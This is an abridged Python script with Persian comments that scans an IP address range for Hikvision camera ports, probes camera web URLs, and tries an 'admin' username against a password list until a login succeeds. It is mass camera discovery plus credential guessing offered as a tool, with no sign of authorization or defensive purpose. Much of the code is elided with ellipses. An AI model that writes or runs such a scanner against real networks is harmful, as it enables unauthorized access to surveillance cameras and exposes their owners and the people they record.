...
def check_ip(ip, port):
    try:
        ...
        sock.settimeout(1)  # تنظیم timeout برای اتصال
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0  # اگر پورت باز باشد، True برمی‌گرداند
...
def is_hikvision_camera(ip):
    try:
        ...
        for url in hikvision_urls:
            ...
            if response.status_code in [200, 401]:  # 401 یعنی احراز هویت لازم است، پس ممکن است دوربین باشد
                return True
...
def scan_ip_range(start_ip, end_ip, output_file, success_file):
    ...
    # لیست پورت‌های رایج دوربین‌های هایک‌ویژن
    camera_ports = [80, 554, 8000]

    # لیست پسوردها و یوزرنیم‌ها
    usernames = ["admin"]
                    ...
                    for username in usernames:
                        for password in passwords:
                            if hikvision_login(ip, username, password):
                                ...
                                break  # اگر لاگین موفق شد، ادامه نده
            start[3] += 1
